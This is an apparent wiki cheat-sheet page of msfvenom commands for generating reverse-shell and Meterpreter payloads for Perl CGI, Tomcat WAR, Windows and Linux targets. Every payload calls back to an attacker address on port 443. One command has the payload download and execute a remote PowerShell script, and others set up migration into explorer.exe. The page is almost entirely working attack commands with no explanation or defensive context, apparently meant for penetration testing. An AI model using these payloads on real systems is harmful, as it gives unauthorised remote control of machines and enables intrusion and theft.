---
title: "Metasploit"
date: 2025-10-02
draft: false
type: wiki
---

# Perl (example to deploy as cgi-bin)

```console
msfvenom -p cmd/unix/reverse_perl LHOST="192.168.42.42" LPORT=443 -f raw -o reverse_shell.cgi
```

-----------------------------

# Java (example to deploy in Tomcat)

```console
msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war
```

-----------------------------

# Windows - Download Reverse Shell

```console
msfvenom -a x86 --platform windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient
).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed BufferR
egister=EAX -f python
```

```console
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.42.42 lport=443 -f csharp
```

We can also use it with the following parameters for migration

```console
msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.59 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f csharp
```

Or either, in the `msfconsole` add the parameter `AutoRunScript`, the following will try to migrate our reverse too explorer.exe:

```console
set AutoRunScript post/windows/manage/migrate name=explorer.exe spawn=false
```

-----------------------------

# Windows - Staged Reverse TCP

```console
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
 ```

-----------------------------

# Windows - Stageless Reverse TCP

 ```console
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o <output_name.format>
 ```

-----------------------------

# Linux - Staged Reverse TCP

 ```console
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o <outout_name>.elf
 ```

 ```console
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o <outout_name>.elf
 ```

-----------------------------
